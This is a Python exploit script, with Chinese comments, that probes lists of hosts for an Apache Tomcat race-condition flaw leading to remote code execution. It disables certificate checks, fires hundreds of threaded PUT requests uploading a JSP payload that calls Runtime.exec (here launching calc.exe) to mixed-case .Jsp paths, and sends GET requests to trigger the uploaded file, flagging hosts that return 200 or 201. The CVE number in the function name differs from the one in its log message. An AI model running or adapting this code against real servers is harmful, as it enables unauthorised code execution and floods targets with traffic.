import concurrent.futures
import logging
import ssl
from urllib.parse import urljoin
from urllib.parse import urlparse
from colorama import Fore, Style

import requests
import urllib3

ssl._create_default_https_context = ssl._create_unverified_context
# 忽略HTTPS请求中的不安全请求警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 配置日志格式，输出INFO级别及以上的日志消息
logging.basicConfig(level=logging.INFO, format='%(message)s')
logger = logging.getLogger()


def read_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.read().splitlines()
    return urls


def check_cve_2024_50739(url, config):
    protocols = ['http://', 'https://']
    found_vulnerabilities = False

    for protocol in protocols:
        target_url = urljoin(protocol + url.lstrip('http://').lstrip('https://'), "/")
        logging.info(f"{Fore.GREEN}Checking {target_url}...")

        target_url_put1 = urljoin(target_url, "/aa.Jsp")
        target_url_put2 = urljoin(target_url, "/bb.Jsp")
        target_url_get1 = urljoin(target_url, "/aa.jsp")
        target_url_get2 = urljoin(target_url, "/bb.jsp")

        headers1 = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
            "Content-Type": "application/json"
        }

        headers2 = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36"
        }
        payload_put = "aa<% Runtime.getRuntime().exec(\"calc.exe\");%>"

        # 增加线程
        with concurrent.futures.ThreadPoolExecutor(max_workers=10000) as executor:
            futures = []
            # 循环执行10000次
            for _ in range(100):
                futures.append(
                    executor.submit(requests.put, target_url_put1, verify=False, headers=headers1, data=payload_put))
                futures.append(
                    executor.submit(requests.put, target_url_put2, verify=False, headers=headers1, data=payload_put))
                futures.append(executor.submit(requests.get, target_url_get1, verify=False, headers=headers2))
                futures.append(executor.submit(requests.get, target_url_get2, verify=False, headers=headers2))

            for future in concurrent.futures.as_completed(futures):
                try:
                    response = future.result()
                    # logging.info(f"Response status: {response.status_code}")
                    if isinstance(response, requests.Response):
                        if (response.status_code == 201) or (response.status_code == 200):
                            found_vulnerabilities = True
                            # logging.info(f"Response status: {response.status_code}")
                except Exception as e:
                    logging.info(f"Error occurred: {e}")

            if found_vulnerabilities:
                logging.info(
                    f"{Fore.GREEN}Find: {url}: Apache Tomcat CVE-2024-50379 Conditional Competition To RCE!")
                return True, None, None

            return False, None, None
